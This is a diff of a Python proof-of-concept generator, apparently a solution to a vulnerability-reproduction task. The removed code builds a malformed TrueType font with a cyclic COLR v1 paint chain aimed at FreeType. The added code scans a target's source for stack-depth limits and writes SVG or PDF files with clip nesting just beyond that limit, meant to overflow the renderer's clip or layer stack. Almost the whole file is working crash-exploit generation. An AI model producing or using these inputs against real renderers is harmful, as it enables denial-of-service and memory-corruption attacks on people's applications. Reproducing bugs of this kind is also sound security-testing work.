@@ -1,437 +1,485 @@
 import os
 import re
-import struct
 import tarfile
-from typing import Dict, List, Optional, Tuple
+import tempfile
+import shutil
+import ast
+from typing import Optional, Tuple, List, Dict
 
 
-def _u16(x: int) -> bytes:
-    return struct.pack(">H", x & 0xFFFF)
+_TEXT_EXTS = {
+    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp",
+    ".m", ".mm", ".java", ".rs", ".go", ".py", ".js", ".ts",
+}
+_MAX_READ = 3 * 1024 * 1024
 
 
-def _s16(x: int) -> bytes:
-    return struct.pack(">h", int(x))
-
-
-def _u32(x: int) -> bytes:
-    return struct.pack(">I", x & 0xFFFFFFFF)
-
-
-def _checksum_u32(data: bytes) -> int:
-    pad = (-len(data)) & 3
-    if pad:
-        data += b"\x00" * pad
-    s = 0
-    for i in range(0, len(data), 4):
-        s = (s + int.from_bytes(data[i:i + 4], "big")) & 0xFFFFFFFF
-    return s
-
-
-def _sfnt_search_params(num_tables: int) -> Tuple[int, int, int]:
-    # per OpenType spec
-    max_pow2 = 1
-    entry_selector = 0
-    while (max_pow2 << 1) <= num_tables:
-        max_pow2 <<= 1
-        entry_selector += 1
-    search_range = max_pow2 * 16
-    range_shift = num_tables * 16 - search_range
-    return search_range, entry_selector, range_shift
-
-
-def _build_head(index_to_loc_format: int = 0) -> bytes:
-    # TrueType 'head' table: 54 bytes
-    # https://learn.microsoft.com/en-us/typography/opentype/spec/head
-    # checkSumAdjustment is patched later.
-    table_version = 0x00010000
-    font_revision = 0x00010000
-    check_sum_adjustment = 0
-    magic_number = 0x5F0F3CF5
-    flags = 0
-    units_per_em = 1000
-    created = 0
-    modified = 0
-    x_min = 0
-    y_min = 0
-    x_max = 0
-    y_max = 0
-    mac_style = 0
-    lowest_rec_ppem = 8
-    font_direction_hint = 2
-    glyph_data_format = 0
-
-    b = bytearray()
-    b += _u32(table_version)
-    b += _u32(font_revision)
-    b += _u32(check_sum_adjustment)
-    b += _u32(magic_number)
-    b += _u16(flags)
-    b += _u16(units_per_em)
-    b += struct.pack(">q", created)
-    b += struct.pack(">q", modified)
-    b += _s16(x_min)
-    b += _s16(y_min)
-    b += _s16(x_max)
-    b += _s16(y_max)
-    b += _u16(mac_style)
-    b += _u16(lowest_rec_ppem)
-    b += _s16(font_direction_hint)
-    b += _s16(index_to_loc_format)
-    b += _s16(glyph_data_format)
-    return bytes(b)
-
-
-def _build_maxp(num_glyphs: int) -> bytes:
-    # maxp version 1.0: 32 bytes
-    b = bytearray()
-    b += _u32(0x00010000)
-    b += _u16(num_glyphs)
-    # remaining fields: set to 0
-    b += b"\x00" * (32 - len(b))
-    return bytes(b)
-
-
-def _build_hhea(number_of_hmetrics: int) -> bytes:
-    # hhea: 36 bytes
-    b = bytearray()
-    b += _u32(0x00010000)  # version
-    b += _s16(800)         # Ascender
-    b += _s16(-200)        # Descender
-    b += _s16(0)           # LineGap
-    b += _u16(500)         # advanceWidthMax
-    b += _s16(0)           # minLeftSideBearing
-    b += _s16(0)           # minRightSideBearing
-    b += _s16(500)         # xMaxExtent
-    b += _s16(1)           # caretSlopeRise
-    b += _s16(0)           # caretSlopeRun
-    b += _s16(0)           # caretOffset
-    b += b"\x00" * 8       # reserved
-    b += _s16(0)           # metricDataFormat
-    b += _u16(number_of_hmetrics)
-    return bytes(b)
-
-
-def _build_hmtx(num_glyphs: int, number_of_hmetrics: int = 1) -> bytes:
-    # numberOfHMetrics full metrics, remaining only LSBs
-    if number_of_hmetrics < 1:
-        number_of_hmetrics = 1
-    if number_of_hmetrics > num_glyphs:
-        number_of_hmetrics = num_glyphs
-    # For simplicity: 1 full metric, rest LSB=0
-    b = bytearray()
-    b += struct.pack(">Hh", 500, 0)
-    b += b"\x00\x00" * (num_glyphs - 1)
-    return bytes(b)
-
-
-def _build_glyf_one_empty_glyph() -> bytes:
-    # One empty simple glyph: numberOfContours=0, bbox=0, total 10 bytes
-    return struct.pack(">hhhhh", 0, 0, 0, 0, 0)
-
-
-def _build_loca_short(num_glyphs: int, glyph0_len: int) -> bytes:
-    # short format: uint16 offsets divided by 2
-    # entries = numGlyphs + 1
-    # glyph 0 length = glyph0_len, glyph 1.. end length = 0
-    # offsets: [0, glyph0_len, glyph0_len, ..., glyph0_len]
-    off_div2 = (glyph0_len // 2) & 0xFFFF
-    b = bytearray()
-    b += struct.pack(">HH", 0, off_div2)
-    b += struct.pack(">H", off_div2) * (num_glyphs - 1)
-    return bytes(b)
-
-
-def _build_cmap_format4_single() -> bytes:
-    # cmap with one Unicode BMP encoding (platform 3, encoding 1), mapping U+0041 to glyph 0.
-    # format 4 with two segments: [0x0041..0x0041] and end marker [0xFFFF..0xFFFF]
-    seg_count = 2
-    seg_count_x2 = seg_count * 2
-    # searchRange = 2*(2^floor(log2(segCount)))
-    max_pow2 = 1
-    entry_selector = 0
-    while (max_pow2 << 1) <= seg_count:
-        max_pow2 <<= 1
-        entry_selector += 1
-    search_range = max_pow2 * 2
-    range_shift = seg_count_x2 - search_range
-
-    end_codes = [0x0041, 0xFFFF]
-    start_codes = [0x0041, 0xFFFF]
-    # idDelta: (glyphId - startCode) mod 65536; for glyph 0 at 0x0041 -> -0x0041 mod
-    id_deltas = [(0 - 0x0041) & 0xFFFF, 1]  # end marker often 1, doesn't matter with idRangeOffset 0
-    id_range_offsets = [0, 0]
-
-    sub = bytearray()
-    sub += _u16(4)       # format
-    sub += _u16(0)       # length placeholder
-    sub += _u16(0)       # language
-    sub += _u16(seg_count_x2)
-    sub += _u16(search_range)
-    sub += _u16(entry_selector)
-    sub += _u16(range_shift)
-    for x in end_codes:
-        sub += _u16(x)
-    sub += _u16(0)  # reservedPad
-    for x in start_codes:
-        sub += _u16(x)
-    for x in id_deltas:
-        sub += _u16(x)
-    for x in id_range_offsets:
-        sub += _u16(x)
-    # no glyphIdArray
-    struct.pack_into(">H", sub, 2, len(sub))  # fill length
-
-    cmap = bytearray()
-    cmap += _u16(0)  # version
-    cmap += _u16(1)  # numTables
-    cmap += _u16(3)  # platformID
-    cmap += _u16(1)  # encodingID
-    cmap += _u32(12)  # offset to subtable from start of cmap
-    cmap += sub
-    return bytes(cmap)
-
-
-def _build_name_empty() -> bytes:
-    # name table with zero records
-    # format=0, count=0, stringOffset=6
-    return struct.pack(">HHH", 0, 0, 6)
-
-
-def _build_post_v3() -> bytes:
-    # post table format 3.0 is 32 bytes
-    b = bytearray()
-    b += _u32(0x00030000)
-    b += b"\x00" * (32 - len(b))
-    return bytes(b)
-
-
-def _build_cpal_minimal() -> bytes:
-    # CPAL v0: 1 palette, 1 entry
-    # uint16 version
-    # uint16 numPaletteEntries
-    # uint16 numPalettes
-    # uint16 numColorRecords
-    # Offset32 colorRecordsOffset
-    # uint16 colorRecordIndices[numPalettes]
-    # ColorRecord[numColorRecords] (BGRA bytes)
-    version = 0
-    num_palette_entries = 1
-    num_palettes = 1
-    num_color_records = 1
-    color_records_offset = 12 + 2 * num_palettes  # header (12) + indices
-    b = bytearray()
-    b += _u16(version)
-    b += _u16(num_palette_entries)
-    b += _u16(num_palettes)
-    b += _u16(num_color_records)
-    b += _u32(color_records_offset)
-    b += _u16(0)  # first palette starts at color record 0
-    b += bytes([0, 0, 0, 255])  # black opaque BGRA
-    return bytes(b)
-
-
-def _build_colr_v1_deep_clip(n_glyphs: int) -> bytes:
-    # COLR v1 header (34 bytes) + BaseGlyphList + Paint tables + ClipList
-    # Uses PaintColrGlyph recursion cycle to grow nesting depth.
-    #
-    # Assumptions aligned with OpenType COLR v1:
-    # - COLR v1 extends v0 header with offsets:
-    #   baseGlyphListOffset, layerListOffset, clipListOffset, varIndexMapOffset, itemVariationStoreOffset.
-    # - BaseGlyphList: uint32 count, then records: uint16 glyphID + Offset32 paintOffset (from COLR start).
-    # - PaintColrGlyph: uint8 format=0x07, uint16 glyphID.
-    # - ClipList: uint8 format=1, uint32 numClipRecords, then records: uint16 start, uint16 end, Offset32 clipBoxOffset (from ClipList start).
-    # - ClipBox: uint8 format=1, int16 xMin,yMin,xMax,yMax.
-    PAINT_COLR_GLYPH = 0x07
-
-    header_len = 34
-    base_glyph_list_offset = header_len
-
-    # BaseGlyphList: count + N records
-    bg_count = n_glyphs
-    bg_list = bytearray(4 + 6 * bg_count)
-    struct.pack_into(">I", bg_list, 0, bg_count)
-
-    paint_data_offset = base_glyph_list_offset + len(bg_list)
-    paint_data = bytearray(3 * n_glyphs)
-    paint_struct = struct.Struct(">BH")
-
-    for gid in range(n_glyphs):
-        paint_off = paint_data_offset + 3 * gid
-        struct.pack_into(">HI", bg_list, 4 + 6 * gid, gid & 0xFFFF, paint_off & 0xFFFFFFFF)
-
-        next_gid = (gid + 1) % n_glyphs
-        paint_struct.pack_into(paint_data, 3 * gid, PAINT_COLR_GLYPH, next_gid & 0xFFFF)
-
-    # ClipList
-    # 1 clip record covering all glyphs, with a single clip box
-    # ClipBoxOffset is relative to start of ClipList.
-    clip_list = bytearray()
-    clip_list += struct.pack(">B", 1)        # format
-    clip_list += struct.pack(">I", 1)        # numClipRecords
-    # record starts at offset 5
-    clip_box_offset = 16  # choose 4-aligned
-    clip_list += struct.pack(">HHI", 0, (n_glyphs - 1) & 0xFFFF, clip_box_offset)
-    # pad to clip_box_offset
-    if len(clip_list) < clip_box_offset:
-        clip_list += b"\x00" * (clip_box_offset - len(clip_list))
-    # ClipBoxFormat1
-    clip_list += struct.pack(">Bhhhh", 1, 0, 0, 100, 100)
-
-    # pad clip list to 4
-    if len(clip_list) & 3:
-        clip_list += b"\x00" * ((-len(clip_list)) & 3)
-
-    # Assemble COLR: header + bg_list + paint_data + (pad) + clip_list
-    colr = bytearray()
-    # v0 header fields
-    colr += _u16(1)   # version
-    colr += _u16(0)   # numBaseGlyphRecords (v0)
-    colr += _u32(0)   # baseGlyphRecordsOffset
-    colr += _u32(0)   # layerRecordsOffset
-    colr += _u16(0)   # numLayerRecords
-
-    # v1 offsets (from COLR start)
-    layer_list_offset = 0
-    # clip list offset placed after bg_list + paint_data (+ pad to 4)
-    body = bytes(bg_list) + bytes(paint_data)
-    if (len(body) + header_len) & 3:
-        body += b"\x00" * ((-(len(body) + header_len)) & 3)
-    clip_list_offset = header_len + len(body)
-
-    colr += _u32(base_glyph_list_offset)
-    colr += _u32(layer_list_offset)
-    colr += _u32(clip_list_offset)
-    colr += _u32(0)  # varIndexMapOffset
-    colr += _u32(0)  # itemVariationStoreOffset
-
-    # ensure header length matches
-    if len(colr) != header_len:
-        # fallback: pad/truncate to 34 (shouldn't happen)
-        if len(colr) < header_len:
-            colr += b"\x00" * (header_len - len(colr))
-        else:
-            colr = colr[:header_len]
-
-    colr += body
-    colr += clip_list
-    return bytes(colr)
-
-
-def _build_ttf_with_colr_poc(num_glyphs: int) -> bytes:
-    # Build a minimal TrueType font with many glyph IDs and a COLR v1 table triggering deep nesting.
-    glyf0 = _build_glyf_one_empty_glyph()
-    # Ensure glyf length is even for short loca
-    if len(glyf0) & 1:
-        glyf0 += b"\x00"
-
-    tables: Dict[bytes, bytes] = {}
-    tables[b"head"] = _build_head(index_to_loc_format=0)
-    tables[b"maxp"] = _build_maxp(num_glyphs)
-    tables[b"hhea"] = _build_hhea(number_of_hmetrics=1)
-    tables[b"hmtx"] = _build_hmtx(num_glyphs, number_of_hmetrics=1)
-    tables[b"glyf"] = glyf0
-    tables[b"loca"] = _build_loca_short(num_glyphs, glyph0_len=len(glyf0))
-    tables[b"cmap"] = _build_cmap_format4_single()
-    tables[b"name"] = _build_name_empty()
-    tables[b"post"] = _build_post_v3()
-    tables[b"CPAL"] = _build_cpal_minimal()
-    tables[b"COLR"] = _build_colr_v1_deep_clip(num_glyphs)
-
-    # Offset table
-    num_tables = len(tables)
-    search_range, entry_selector, range_shift = _sfnt_search_params(num_tables)
-
-    # Prepare sorted tags
-    tags = sorted(tables.keys())
-
-    # Compute table data with padding and checksums
-    records: List[Tuple[bytes, int, int, int]] = []  # tag, checksum, offset, length
-    offset_table_len = 12 + 16 * num_tables
-    cur_off = offset_table_len
-
-    table_datas: Dict[bytes, bytes] = {}
-    for tag in tags:
-        data = tables[tag]
-        length = len(data)
-        padded = data + (b"\x00" * ((-length) & 3))
-        table_datas[tag] = padded
-        chk = _checksum_u32(padded)
-        records.append((tag, chk, cur_off, length))
-        cur_off += len(padded)
-
-    # Build font
-    font = bytearray()
-    font += _u32(0x00010000)  # scaler type
-    font += _u16(num_tables)
-    font += _u16(search_range)
-    font += _u16(entry_selector)
-    font += _u16(range_shift)
-
-    for tag, chk, off, length in records:
-        font += tag
-        font += _u32(chk)
-        font += _u32(off)
-        font += _u32(length)
-
-    for tag in tags:
-        font += table_datas[tag]
-
-    # Patch head.checkSumAdjustment
-    head_off = None
-    for tag, chk, off, length in records:
-        if tag == b"head":
-            head_off = off
-            break
-    if head_off is not None and head_off + 12 <= len(font):
-        struct.pack_into(">I", font, head_off + 8, 0)
-        whole_sum = _checksum_u32(bytes(font))
-        adjustment = (0xB1B0AFBA - whole_sum) & 0xFFFFFFFF
-        struct.pack_into(">I", font, head_off + 8, adjustment)
-
-    return bytes(font)
-
-
-def _tar_has_freetype_markers(src_path: str) -> bool:
+def _is_within_directory(directory: str, target: str) -> bool:
+    directory = os.path.abspath(directory)
+    target = os.path.abspath(target)
     try:
-        with tarfile.open(src_path, "r:*") as tf:
-            names = tf.getnames()
-            for n in names:
-                ln = n.lower()
-                if ln.endswith("include/freetype/freetype.h") or ln.endswith("/freetype.h"):
-                    return True
-                if ln.endswith("src/sfnt/ttcolr.c") or ln.endswith("ttcolr.c"):
-                    return True
-                if "freetype" in ln and (ln.endswith(".c") or ln.endswith(".h")):
-                    # weak signal
-                    return True
-    except Exception:
+        common = os.path.commonpath([directory, target])
+    except ValueError:
         return False
-    return False
+    return common == directory
 
 
-def _fallback_svg_poc(target_size: int = 920000) -> bytes:
-    # Deep nesting with clip-path to stress clip stack in many SVG renderers.
-    header = b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>'
+def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
+    for member in tar.getmembers():
+        member_path = os.path.join(path, member.name)
+        if not _is_within_directory(path, member_path):
+            continue
+        tar.extract(member, path=path)
+
+
+def _maybe_single_subdir_root(root: str) -> str:
+    try:
+        entries = [e for e in os.listdir(root) if e not in (".", "..")]
+    except OSError:
+        return root
+    if len(entries) != 1:
+        return root
+    one = os.path.join(root, entries[0])
+    if os.path.isdir(one):
+        return one
+    return root
+
+
+def _read_text_file(path: str, max_bytes: int = _MAX_READ) -> Optional[str]:
+    try:
+        st = os.stat(path)
+        if st.st_size <= 0:
+            return ""
+        if st.st_size > max_bytes:
+            return None
+        with open(path, "rb") as f:
+            data = f.read(max_bytes + 1)
+        if len(data) > max_bytes:
+            return None
+        return data.decode("utf-8", errors="ignore")
+    except OSError:
+        return None
+
+
+def _walk_files(root: str, only_likely: bool = False) -> List[str]:
+    res = []
+    skip_dirs = {".git", ".hg", ".svn", "out", "build", "cmake-build-debug", "cmake-build-release"}
+    for dirpath, dirnames, filenames in os.walk(root):
+        dn = os.path.basename(dirpath)
+        if dn in skip_dirs:
+            dirnames[:] = []
+            continue
+        if only_likely:
+            low = dirpath.lower()
+            if not any(k in low for k in ("fuzz", "fuzzer", "oss-fuzz", "ossfuzz", "tests", "test")):
+                continue
+        for fn in filenames:
+            ext = os.path.splitext(fn)[1].lower()
+            if ext in _TEXT_EXTS:
+                res.append(os.path.join(dirpath, fn))
+    return res
+
+
+def _find_fuzzer_harnesses(root: str) -> List[Tuple[str, str]]:
+    harnesses: List[Tuple[str, str]] = []
+    files = _walk_files(root, only_likely=True)
+    if not files:
+        files = _walk_files(root, only_likely=False)
+    for p in files:
+        txt = _read_text_file(p)
+        if not txt:
+            continue
+        if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt:
+            harnesses.append((p, txt))
+    return harnesses
+
+
+def _score_formats_from_text(txt: str) -> Dict[str, int]:
+    t = txt
+    tl = t.lower()
+    score = {"svg": 0, "pdf": 0, "json": 0, "unknown": 0}
+
+    if "sksvg" in t or "SkSVG" in t or "svgdom" in tl or "svg" in tl:
+        score["svg"] += 5
+    if "rsvg_handle_new_from_data" in tl or "librsvg" in tl:
+        score["svg"] += 5
+    if "xmlreadmemory" in tl and "svg" in tl:
+        score["svg"] += 2
+
+    if "FPDF_LoadMemDocument" in t or "pdfium" in tl:
+        score["pdf"] += 7
+    if "fz_open_document" in t or "mupdf" in tl:
+        score["pdf"] += 7
+    if "%pdf" in tl or "pdf" in tl:
+        score["pdf"] += 2
+    if "qpdf" in tl:
+        score["pdf"] += 2
+
+    if "nlohmann::json" in t or "rapidjson" in tl or "json" in tl:
+        score["json"] += 2
+    if "skottie" in tl or "lottie" in tl:
+        score["json"] += 7
+
+    return score
+
+
+def _detect_format(root: str) -> str:
+    # Fast path by known directory structure.
+    if os.path.isdir(os.path.join(root, "modules", "svg")) or os.path.isdir(os.path.join(root, "modules", "svg", "src")):
+        return "svg"
+    if os.path.isdir(os.path.join(root, "third_party", "librsvg")):
+        return "svg"
+    if os.path.isdir(os.path.join(root, "pdfium")) or os.path.isdir(os.path.join(root, "core", "fxcrt")):
+        # pdfium-ish
+        return "pdf"
+
+    harnesses = _find_fuzzer_harnesses(root)
+    if harnesses:
+        agg = {"svg": 0, "pdf": 0, "json": 0, "unknown": 0}
+        for _, txt in harnesses:
+            sc = _score_formats_from_text(txt)
+            for k, v in sc.items():
+                agg[k] += v
+        best = max(agg.items(), key=lambda kv: kv[1])[0]
+        if agg[best] > 0:
+            return best
+
+    # Heuristic scan for indicative headers
+    for p in _walk_files(root, only_likely=True)[:200]:
+        txt = _read_text_file(p)
+        if not txt:
+            continue
+        sc = _score_formats_from_text(txt)
+        best = max(sc.items(), key=lambda kv: kv[1])[0]
+        if sc[best] >= 5:
+            return best
+
+    return "svg"
+
+
+_ALLOWED_AST_NODES = (
+    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Num, ast.Constant,
+    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
+    ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor,
+    ast.UAdd, ast.USub, ast.Invert, ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
+)
+
+
+def _safe_eval_int_expr(expr: str) -> Optional[int]:
+    if expr is None:
+        return None
+    e = expr.strip()
+    if not e:
+        return None
+    e = re.sub(r"//.*", "", e)
+    e = re.sub(r"/\*.*?\*/", "", e, flags=re.DOTALL)
+    e = e.strip()
+    if not e:
+        return None
+    # Remove common casts
+    e = re.sub(r"\bstatic_cast\s*<[^>]*>\s*\(", "(", e)
+    e = re.sub(r"\breinterpret_cast\s*<[^>]*>\s*\(", "(", e)
+    e = re.sub(r"\bconst_cast\s*<[^>]*>\s*\(", "(", e)
+    e = re.sub(r"\bdynamic_cast\s*<[^>]*>\s*\(", "(", e)
+    # Remove integer suffixes
+    e = re.sub(r"(\d+)\s*[uUlL]+\b", r"\1", e)
+    # Remove digit separators
+    e = e.replace("'", "").replace("_", "")
+    # Reject if contains suspicious characters/identifiers
+    if re.search(r"[A-Za-z]", e):
+        return None
+    if re.search(r"[^0-9\s\(\)\+\-\*/%<>\|\&\^~]", e):
+        return None
+    try:
+        node = ast.parse(e, mode="eval")
+    except SyntaxError:
+        return None
+
+    def _check(n: ast.AST) -> bool:
+        for child in ast.walk(n):
+            if not isinstance(child, _ALLOWED_AST_NODES):
+                return False
+            if isinstance(child, ast.Call) or isinstance(child, ast.Name) or isinstance(child, ast.Attribute):
+                return False
+        return True
+
+    if not _check(node):
+        return None
+    try:
+        v = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
+    except Exception:
+        return None
+    if isinstance(v, bool):
+        return int(v)
+    if isinstance(v, int):
+        return v
+    if isinstance(v, float) and v.is_integer():
+        return int(v)
+    return None
+
+
+def _extract_candidates_from_text(txt: str) -> List[Tuple[int, int]]:
+    # Returns list of (value, score)
+    candidates: List[Tuple[int, int]] = []
+
+    kw_focus = ("clip", "layer", "stack", "depth", "nest", "mark", "save", "restore")
+    txtl = txt.lower()
+
+    def score_name(name: str) -> int:
+        n = name.lower()
+        s = 0
+        if "max" in n:
+            s += 4
+        if "depth" in n or "stack" in n:
+            s += 4
+        if "clip" in n:
+            s += 3
+        if "layer" in n:
+            s += 3
+        if "nest" in n:
+            s += 2
+        if "mark" in n:
+            s += 1
+        if "limit" in n:
+            s += 2
+        return s
+
+    # #define NAME expr
+    for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$", txt, flags=re.MULTILINE):
+        name = m.group(1)
+        expr = m.group(2)
+        if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
+            continue
+        v = _safe_eval_int_expr(expr)
+        if v is None:
+            continue
+        if 8 <= v <= 500000:
+            candidates.append((v, score_name(name)))
+
+    # constexpr/const NAME = expr;
+    for m in re.finditer(
+        r"\b(?:static\s+)?(?:constexpr|const)\s+(?:unsigned\s+)?(?:int|size_t|uint32_t|uint16_t|uint64_t|long|short)\s+"
+        r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;]+);",
+        txt,
+        flags=re.MULTILINE,
+    ):
+        name = m.group(1)
+        expr = m.group(2)
+        if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
+            continue
+        v = _safe_eval_int_expr(expr)
+        if v is None:
+            continue
+        if 8 <= v <= 500000:
+            candidates.append((v, score_name(name)))
+
+    # enum { NAME = expr, ... };
+    for m in re.finditer(r"\benum\b[^{}]*\{([^}]+)\}", txt, flags=re.DOTALL):
+        body = m.group(1)
+        for mm in re.finditer(r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^,}]+)", body):
+            name = mm.group(1)
+            expr = mm.group(2)
+            if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
+                continue
+            v = _safe_eval_int_expr(expr)
+            if v is None:
+                continue
+            if 8 <= v <= 500000:
+                candidates.append((v, score_name(name)))
+
+    # Numeric array sizes in lines with clip/layer/stack terms
+    for line in txt.splitlines():
+        ll = line.lower()
+        if not any(k in ll for k in ("stack", "depth", "nest")):
+            continue
+        if not any(k in ll for k in ("clip", "layer")):
+            continue
+        for m in re.finditer(r"\[\s*(\d{2,6})\s*\]", line):
+            v = int(m.group(1))
+            if 8 <= v <= 500000:
+                s = 1
+                for k in kw_focus:
+                    if k in ll:
+                        s += 1
+                candidates.append((v, s))
+
+    # If any "layer/clip stack" nearby, add some bonus to all candidates found in same file later by selecting best overall elsewhere.
+    if "layer/clip" in txtl or "layer clip" in txtl:
+        candidates = [(v, s + 2) for (v, s) in candidates]
+    if "clip mark" in txtl or "clipmark" in txtl:
+        candidates = [(v, s + 2) for (v, s) in candidates]
+
+    return candidates
+
+
+def _extract_depth_limit(root: str, prefer_dirs: Optional[List[str]] = None) -> Optional[int]:
+    keywords = (
+        "layer/clip stack",
+        "layer clip stack",
+        "layerclip",
+        "clip mark",
+        "clipmark",
+        "nesting depth",
+        "nestingdepth",
+        "fNestingDepth",
+        "clip stack",
+        "layer stack",
+    )
+
+    search_roots = []
+    if prefer_dirs:
+        for d in prefer_dirs:
+            p = os.path.join(root, d)
+            if os.path.isdir(p):
+                search_roots.append(p)
+    if not search_roots:
+        search_roots = [root]
+
+    best_val = None
+    best_score = -1
+
+    for sr in search_roots:
+        for dirpath, dirnames, filenames in os.walk(sr):
+            dn = os.path.basename(dirpath)
+            if dn in (".git", ".hg", ".svn", "out", "build"):
+                dirnames[:] = []
+                continue
+            for fn in filenames:
+                ext = os.path.splitext(fn)[1].lower()
+                if ext not in _TEXT_EXTS:
+                    continue
+                fp = os.path.join(dirpath, fn)
+                txt = _read_text_file(fp)
+                if txt is None:
+                    continue
+                if not txt:
+                    continue
+                tl = txt.lower()
+                if not any(k in tl for k in keywords):
+                    continue
+                cands = _extract_candidates_from_text(txt)
+                for v, s in cands:
+                    if s > best_score:
+                        best_score = s
+                        best_val = v
+
+    return best_val
+
+
+def _build_svg_poc(depth: int) -> bytes:
+    if depth < 1:
+        depth = 1
+    # Minimal, valid SVG with deep nested clip usage.
+    prefix = (
+        '<?xml version="1.0"?>'
+        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
+        '<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
+    ).encode("utf-8")
     open_tag = b'<g clip-path="url(#c)">'
-    close_tag = b'</g>'
-    footer = b'</svg>'
+    close_tag = b"</g>"
+    mid = b'<rect width="1" height="1"/>'
+    suffix = b"</svg>"
+    return b"".join([prefix, open_tag * depth, mid, close_tag * depth, suffix])
 
-    # Compute depth to approach target_size
-    base = len(header) + len(footer)
-    per = len(open_tag) + len(close_tag)
-    if target_size <= base + per:
-        return header + open_tag + close_tag + footer
 
-    depth = (target_size - base) // per
-    body = open_tag * depth + close_tag * depth
-    return header + body + footer
+def _build_pdf_poc(depth: int) -> bytes:
+    if depth < 1:
+        depth = 1
+    # Content: deep q + clip nesting to overflow clip/layer stack.
+    # Each level: q 0 0 1 1 re W n
+    per = b"q 0 0 1 1 re W n\n"
+    content = per * depth + b"0 0 1 1 re f\n" + (b"Q\n" * depth)
+
+    # PDF objects
+    objs: List[bytes] = []
+    objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
+    objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
+    objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>")
+    stream_obj = b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream"
+    objs.append(stream_obj)
+
+    out = bytearray()
+    out.extend(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
+    offsets = [0]
+    for i, obj in enumerate(objs, start=1):
+        offsets.append(len(out))
+        out.extend(f"{i} 0 obj\n".encode("ascii"))
+        out.extend(obj)
+        out.extend(b"\nendobj\n")
+
+    xref_pos = len(out)
+    out.extend(b"xref\n")
+    out.extend(f"0 {len(objs)+1}\n".encode("ascii"))
+    out.extend(b"0000000000 65535 f \n")
+    for i in range(1, len(objs) + 1):
+        out.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
+    out.extend(b"trailer\n")
+    out.extend(f"<< /Size {len(objs)+1} /Root 1 0 R >>\n".encode("ascii"))
+    out.extend(b"startxref\n")
+    out.extend(f"{xref_pos}\n".encode("ascii"))
+    out.extend(b"%%EOF\n")
+    return bytes(out)
+
+
+def _pick_prefer_dirs(root: str, fmt: str) -> List[str]:
+    if fmt == "svg":
+        for cand in ("modules/svg", "module/svg", "svg", "src/svg", "lib/svg"):
+            if os.path.isdir(os.path.join(root, cand)):
+                return [cand]
+        return ["modules", "src", ""]
+    if fmt == "pdf":
+        for cand in ("pdf", "src/pdf", "renderer/pdf", "pdfium", "mupdf", "third_party/mupdf"):
+            if os.path.isdir(os.path.join(root, cand)):
+                return [cand]
+        return ["src", ""]
+    if fmt == "json":
+        for cand in ("modules/skottie", "skottie", "src/skottie", "lottie"):
+            if os.path.isdir(os.path.join(root, cand)):
+                return [cand]
+        return ["src", ""]
+    return [""]
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Heuristic: this issue description strongly matches FreeType COLR v1 deep nesting with clips.
-        # If the tarball doesn't look like FreeType, return a generic deep-nesting SVG fallback.
-        if src_path and os.path.exists(src_path) and _tar_has_freetype_markers(src_path):
-            # Max TrueType numGlyphs = 65535; pick this to maximize nesting depth.
-            return _build_ttf_with_colr_poc(65535)
-        return _fallback_svg_poc(920000)
+        tmpdir = None
+        root = src_path
+        if os.path.isfile(src_path):
+            tmpdir = tempfile.mkdtemp(prefix="poc_src_")
+            try:
+                with tarfile.open(src_path, "r:*") as tar:
+                    _safe_extract(tar, tmpdir)
+                root = _maybe_single_subdir_root(tmpdir)
+            except Exception:
+                if tmpdir:
+                    shutil.rmtree(tmpdir, ignore_errors=True)
+                tmpdir = None
+                root = src_path
+        elif os.path.isdir(src_path):
+            root = src_path
+
+        try:
+            fmt = _detect_format(root)
+            prefer_dirs = _pick_prefer_dirs(root, fmt)
+            limit = _extract_depth_limit(root, prefer_dirs=prefer_dirs)
+
+            if limit is None:
+                # Conservative defaults that avoid extreme recursion but still likely exceed typical fixed stacks.
+                if fmt == "pdf":
+                    depth = 50000
+                elif fmt == "svg":
+                    depth = 5000
+                else:
+                    depth = 5000
+            else:
+                depth = int(limit) + 8
+                if depth < 64:
+                    depth = 128
+
+            if fmt == "pdf":
+                return _build_pdf_poc(depth)
+            # If json, fallback to svg-like XML is probably wrong; but we do svg unless explicit json support exists.
+            return _build_svg_poc(depth)
+        finally:
+            if tmpdir:
+                shutil.rmtree(tmpdir, ignore_errors=True)
